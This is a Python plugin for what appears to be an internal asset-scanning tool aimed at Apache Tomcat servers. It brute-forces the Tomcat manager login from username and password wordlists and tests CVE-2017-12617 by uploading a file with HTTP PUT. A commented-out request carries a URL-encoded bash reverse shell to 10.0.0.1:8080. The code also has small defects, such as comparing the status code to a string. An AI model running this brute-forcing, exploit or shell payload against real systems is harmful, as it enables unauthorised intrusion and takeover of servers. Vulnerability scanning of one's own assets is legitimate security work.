import requests
from apps.assets.models import Port, Risk
import uuid
from django.conf import settings
import base64
from lib.wechat_notice import wechat
from loguru import logger
from multiprocessing.dummy import Pool as ThreadPool

timeout = 2

plugin = 'tomcat'


def start(**kwargs):
    webapps = kwargs['webapps']
    policy = kwargs['policy']
    assets = kwargs['assets']
    ports = Port.objects.filter(asset_id__in=assets, software_name__icontains='tomcat')
    if not ports:
        logger.debug("[%s] %s" % (plugin, 'There are no objects to scan'))

    with open('/opt/warden/warden/brute/usernames.txt', 'r') as f:
        usernames = f.readlines()
    with open('/opt/warden/warden/brute/passwords.txt', 'r') as f:
        passwords = f.readlines()

    schemas = ['http', 'https']

    for port in ports:
        ip = port.asset.ip

        logger.info('-' * 75)
        logger.info('%-30s%-30s' % ('+ Scan Target:', ip + '\t' + str(port.port_num)))  # 必须转换端口类型
        logger.info('%-30s%-30s' % ('- Scan Plugin:', '<tomcat>'))

        # brute(usernames, passwords, ip, port, schemas)
        # cve_2017_12617(ip, port, schemas)


def brute(usernames, passwords, ip, port, schemas):

    flag_list = ['Application Manager', 'Welcome']
    for schema in schemas:
        url = schema + '://' + ip + ':' + str(port.port_num) + '/manager/html'
        try:
            r = requests.get(url, timeout=10, verify=False, allow_redirects=False)
            if r.status_code == '404':
                continue
        except:
            continue

        for password in passwords:
            password = password.strip()
            for username in usernames:
                username = username.strip()
                auth_str_temp = bytes(username + ':' + password, encoding="utf8")
                auth_str = base64.b64encode(auth_str_temp).decode()

                headers = {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
                    "Authorization": "Basic " + auth_str,
                    # "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,[i]/[/i];q=0.8",
                    # "Accept-Encoding": "gzip, deflate, sdch"
                }
                url = schema + '://' + ip + ':' + str(port.port_num) + '/manager/html'
                try:
                    r = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
                    for flag in flag_list:
                        if flag in r.text:
                            info = '%s password is %s:%s' % (url, username, password)
                            logger.info(info)
                            Risk.objects.update_or_create(port=port, defaults={'asset': port.asset,
                                                                               'risk_type': 'tomcat弱口令',
                                                                               'desc': info})
                            logger.info('%-30s%-30s' % ('- Has Risk:', "[True], this host is vulnerable"))
                except Exception as e:
                    continue

    logger.info('-'*75)


def cve_2017_12617(ip, port, schemas):
    filename = uuid.uuid1()
    for schema in schemas:
        targeturl = "%s://%s:%s/cve_2017_12617.txt" % (schema, ip, port.port_num)
        logger.info('+ Scan Target:', targeturl)  # 必须转换端口类型

        try:
            response = requests.put(targeturl, data='cve_2017_12617', verify=False, timeout=5)
            if response.status_code == 201:
                logger.info('文件上传成功， 可能存在Tomcat远程代码执行漏洞')
            # requests.get(targeturl + "?i=%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%30%2e%30%2e%31%2f%38%30%38%30%20%30%3e%26%31%0a")
        except Exception as e:
            logger.info(e)